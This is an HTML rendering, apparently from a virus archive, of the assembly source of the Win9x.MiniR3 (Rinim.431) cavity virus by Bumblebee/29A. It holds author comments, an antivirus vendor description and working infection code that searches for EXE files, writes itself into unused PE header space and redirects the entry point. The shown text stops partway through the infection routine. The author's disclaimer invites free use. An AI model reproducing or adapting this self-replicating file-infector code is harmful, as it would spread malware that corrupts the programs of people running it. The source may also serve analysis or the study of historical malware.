<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Win9x.Rinim.431 - minir3.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Win9x.MiniR3 (Mini-Ring3 virus) [aka AVP Win95.Rinim.431]</span><span class="sc0">
</span><span class="sc1">;  Coded by Bumblebee/29A</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Cavity win9x run-time virus of 431 bytes</span><span class="sc0">
</span><span class="sc1">;  Only uses VxDCALL0...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Disclaimer</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  This  is the  source  of  a VIRUS.  Feel free  to use at  your will.</span><span class="sc0">
</span><span class="sc1">;  Notice  that the  author is not  responsabile  of the  damages  that</span><span class="sc0">
</span><span class="sc1">;  may occur due to the assembly of this file.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Comments</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  I'm  not good  with optimizations.  I played with  this  virus 'till</span><span class="sc0">
</span><span class="sc1">;  boredom.  But is nice for a win run-time (into ring3).  No infection</span><span class="sc0">
</span><span class="sc1">;  check is  needed because ever  tries to infect the  file in the same</span><span class="sc0">
</span><span class="sc1">;  point: just following the  last section in the header. I tried to do</span><span class="sc0">
</span><span class="sc1">;  it as stable as posible without SEH.</span><span class="sc0">
</span><span class="sc1">;  The cavity  stuff needs  the virus  expands  the header size to load</span><span class="sc0">
</span><span class="sc1">;  into memory in the right way. So i set the header size to code base.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  This  virus  was  presented to the  world as  infected part  of some</span><span class="sc0">
</span><span class="sc1">;  i-worms like anap and gift family.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  AVP desc of the baby:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Win95.Rinim</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;It is not a dangerous nonmemory  resident  parasitic  virus  infecting</span><span class="sc0">
</span><span class="sc1">;Win32 EXE files (PE). It was posted to Internet newsgroups in  October</span><span class="sc0">
</span><span class="sc1">;1999 together with another Windows virus "I-Worm.Gift". </span><span class="sc0">
</span><span class="sc1">;The "Rinim" virus is similar to the "Win95.Murkry" virus and uses  the</span><span class="sc0">
</span><span class="sc1">;same  infection way: When  an  infected files is  executed, the  virus</span><span class="sc0">
</span><span class="sc1">;searches  for all PE-EXE  files  in the current directory  and infects</span><span class="sc0">
</span><span class="sc1">;them. While  infecting a file the  virus writes itself to the not used</span><span class="sc0">
</span><span class="sc1">;space in the PE header. Because the virus  is extremely  short  (about</span><span class="sc0">
</span><span class="sc1">;400 bytes), it is very possible a cave of such size can be found in PE</span><span class="sc0">
</span><span class="sc1">;header. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;The virus has no trigger routine. It contains the text string: </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; MiniR3</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                                                    The way of the bee</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc2">.386p</span><span class="sc0">
</span><span class="sc5">locals</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc10">STDCALL</span><span class="sc0">

        </span><span class="sc5">vSize</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">vEnd</span><span class="sc4">-</span><span class="sc5">vBegin</span><span class="sc0">
        </span><span class="sc5">KERNEL32</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0bff70000h</span><span class="sc0">
        </span><span class="sc5">FSTGENPAGE</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">000400000h</span><span class="sc4">/</span><span class="sc2">1000h</span><span class="sc0">
        </span><span class="sc5">K</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">vId</span><span class="sc0">

        </span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">        </span><span class="sc1">; needed for 1st generation</span><span class="sc0">

</span><span class="sc9">.DATA</span><span class="sc0">
        </span><span class="sc1">; dummy data</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'WARNING - This is a virus carrier - WARNING'</span><span class="sc0">

</span><span class="sc9">.CODE</span><span class="sc0">

</span><span class="sc5">vBegin</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">inicio</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">68h</span><span class="sc0">                             </span><span class="sc1">; save into stack the</span><span class="sc0">
</span><span class="sc5">host_ep</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">; hoste ip</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">8h</span><span class="sc4">],</span><span class="sc2">0fbh</span><span class="sc0">          </span><span class="sc1">; test we are under win9x</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">                                  </span><span class="sc1">; save all registers</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">exitMini</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">delta</span><span class="sc0">                           </span><span class="sc1">; get delta offset</span><span class="sc0">
</span><span class="sc5">vId</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'MiniR3'</span><span class="sc0">                        </span><span class="sc1">; virus identifier</span><span class="sc0">
</span><span class="sc5">delta</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">                             </span><span class="sc1">; don't use sub ebp, offs..</span><span class="sc0">
                                                </span><span class="sc1">; use K instead (less bytes)</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">KERNEL32</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc0">                </span><span class="sc1">; scan for VxDCALL0</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">KERNEL32</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">+</span><span class="sc5">KERNEL32</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">KERNEL32</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">KERNEL32</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">20060000h</span><span class="sc0">                       </span><span class="sc1">; make current page</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">                              </span><span class="sc1">; r/w</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">68h</span><span class="sc0">
</span><span class="sc5">currPage</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">FSTGENPAGE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1000dh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_VxDCALL0</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc5">K</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; now store VxDCALL0 addr</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">exitMini</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00020000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">00040000h</span><span class="sc0">          </span><span class="sc1">; alloc memory</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80060000h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00010000h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_VxDCALL0</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc5">K</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">exitMini</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vdata</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc5">K</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; save address</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00020000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">00040000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">8h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">                              </span><span class="sc1">; commit the memory</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2h</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00010001h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_VxDCALL0</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc5">K</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">exitMini</span><span class="sc0">    

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">                          </span><span class="sc1">; set DTA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vdata</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc5">K</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; to our data buffer</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exitMini</span><span class="sc0">    

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">                          </span><span class="sc1">; find 1st exe</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">fmask</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc5">K</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">doNext</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exitMini</span><span class="sc0">    

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vdata</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc5">K</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; get name</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">101eh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infection</span><span class="sc0">                       </span><span class="sc1">; infect</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">                          </span><span class="sc1">; find next</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">doNext</span><span class="sc0">

</span><span class="sc5">exitMini</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">                                   </span><span class="sc1">; restore regs</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">                                     </span><span class="sc1">; jmp to hoste</span><span class="sc0">

</span><span class="sc5">_VxDCALL0</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">; save VxDCALL0 addr</span><span class="sc0">
</span><span class="sc5">vdata</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">; handle for memory</span><span class="sc0">
</span><span class="sc5">fmask</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'*.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; mask for find files</span><span class="sc0">

</span><span class="sc5">int21h</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">; int 21h using</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; VxDCALL0 services</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">002a0010h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_VxDCALL0</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc5">K</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">infection</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">; infection</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">                        </span><span class="sc1">; open file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">errorInf</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                          </span><span class="sc1">; read 1000h bytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vdata</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc5">K</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">errorInfC</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; test if EXE</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">errorInfC</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; test if PE doing a</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">600h</span><span class="sc0">                        </span><span class="sc1">; easy check to avoid</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; exceptions</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">errorInfC</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">errorInfC</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">; skip image header and</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">                         </span><span class="sc1">; optional header</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; search end of last</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">                          </span><span class="sc1">; section desc</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2ch</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; get code base</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">54h</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">; expand the header</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; store new ep get old</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vdata</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc5">K</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; and save. calc</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; the page for the hoste</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">currPage</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc5">K</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">host_ep</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc5">K</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">vSize</span><span class="sc0">                       </span><span class="sc1">; test if there is space</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; spent 2 bytes with</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">                                  </span><span class="sc1">; pushad/popad</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">scasb</span><span class="sc0">                           </span><span class="sc1">; i want to save ecx edi</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">      
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">errorInfC</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">vBegin</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc5">K</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; copy virus</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc0">                          </span><span class="sc1">; move BOF (eax is zero)</span><span class="sc0">
        </span><span class="sc6">cdq</span><span class="sc0">                                     </span><span class="sc1">; edx=0</span><span class="sc0">
</span><span class="sc1">; -&gt;    xor     ecx,ecx                         ; and ecx is zero</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21h</span><span class="sc0">                          </span><span class="sc1">; after the rep movsb</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">errorInfC</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                          </span><span class="sc1">; write to disk</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vdata</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc5">K</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21h</span><span class="sc0">

</span><span class="sc5">errorInfC</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                          </span><span class="sc1">; close the file</span><span class="sc0">
